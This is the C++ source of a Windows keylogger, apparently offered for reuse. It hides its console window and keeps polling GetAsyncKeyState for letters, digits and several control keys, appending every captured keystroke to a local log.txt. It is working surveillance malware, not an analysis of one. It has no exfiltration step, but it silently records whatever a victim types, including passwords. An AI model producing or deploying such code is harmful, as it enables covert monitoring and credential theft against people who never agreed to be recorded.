#include <windows.h>
#include <fstream>

using namespace std;
char chars_to_detect[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "; // This are the char you wanna detect

void write_file(char to_write) // IMPORTANT! All the data will be written in log.txt
{
    ofstream log;
    log.open("log.txt", ofstream::app);
    log << to_write;
    log.close();
}
int main() // No arguments required to execute the program
{
	  ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // Hides the console
    while (true)
    {
        Sleep(5);
        for (int i = 0; i < sizeof(chars_to_detect); i++)
        {
            if (GetAsyncKeyState(chars_to_detect[i]) == -32767)
            {
                if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) { write_file((char)toupper(chars_to_detect[i])); }
                else { write_file((char)tolower(chars_to_detect[i])); }
            }
            if (GetAsyncKeyState(VK_BACK) == -32767)
            {
                ofstream log;
                log.open("log.txt", ofstream::app);
                log << "[DEL]";
                log.close();
            }
            if (GetAsyncKeyState(VK_RETURN) == -32767) {write_file('\n');}
            if (GetAsyncKeyState(VK_OEM_PERIOD) == -32767) {write_file('.');}
            if (GetAsyncKeyState(VK_SHIFT) == -32767)
            {
                ofstream log;
                log.open("log.txt", ofstream::app);
                log << "[SHIFT]";
                log.close();
            }
            if (GetAsyncKeyState(VK_MENU) == -32767)
            {
                ofstream log;
                log.open("log.txt", ofstream::app);
                log << "[ALT]";
                log.close();
            }
        }
    }
}
